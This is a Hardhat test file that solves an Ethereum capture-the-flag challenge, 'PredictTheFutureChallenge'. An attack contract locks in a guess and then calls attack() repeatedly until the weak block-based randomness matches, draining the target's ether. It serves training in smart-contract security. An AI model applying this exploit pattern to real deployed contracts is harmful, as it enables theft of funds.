import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils, provider } = ethers;

describe('PredictTheFutureChallenge', () => {
  let target: Contract;
  let attackContract : Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheFutureChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);

    attackContract = await (
      await ethers.getContractFactory('AttackPredictTheFutureChallenge', deployer)
    ).deploy(target.address);
    
    await attackContract.deployed();
    //Deploy attack contract instance
    attackContract = await attackContract.connect(attacker);
  });

  it('exploit', async () => {
    expect(await provider.getBalance(attackContract.address)).to.equal(0);
    //Lock in our 'guess'
    const myGuessTx = await attackContract.lockInGuess({value: utils.parseEther('1'),});
    await myGuessTx.wait();

    //answer will be 0-9 because of '% 10', so it is manageable
    while(!(await target.isComplete())){
      try{
        const attackTx = await attackContract.attack();
        await attackTx.wait();
      } catch (err){
        //The attack contract will revert call until answer == myGuess
        await expect(Promise.reject(err)).to.be.reverted;
      }
    }
    expect(await provider.getBalance(target.address)).to.equal(0);
    expect(await target.isComplete()).to.equal(true);
  });
});
